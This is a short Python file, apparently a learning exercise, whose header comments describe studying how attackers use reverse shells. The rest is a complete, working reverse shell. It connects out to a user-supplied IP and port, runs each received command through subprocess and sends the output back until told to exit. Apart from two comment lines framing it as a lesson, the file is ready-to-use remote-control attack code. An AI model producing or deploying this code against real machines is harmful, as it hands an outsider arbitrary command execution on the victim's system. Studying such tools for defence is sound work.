# - Topics:
# - Learn how attackers use reverse shells to gain control of remote systems.
# - Project:
# - Write a basic reverse shell in Python that connects to a remote server
# - and allows command execution.

import socket, subprocess

def main():
    # Get the server IP address and port number from the user
    server_ip = input("Enter the server IP address: ")
    server_port = int(input("Enter the server port number: "))

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        s.connect((server_ip, server_port))
        print(f"[+] Connected to {server_ip}, {server_port}")

        while True:
            # Receive command from the server
            command = s.recv(1024).decode("utf-8").strip()

            # Break the loop if no command is received or "exit" command is received
            if not command:
                break
            if command.lower() == "exit":
                print("[+] Exit command received, closing connection")
                break
            
            # Execute the command and send back the output
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
    except Exception as e:
        # Handle any exception that occurs
        print(f"An error occurred: {e}")
    
    finally:
        # Close the socket connection
        s.close()
        print("[*] Connection closed, Goodbye.")

if __name__ == "__main__":
    main()
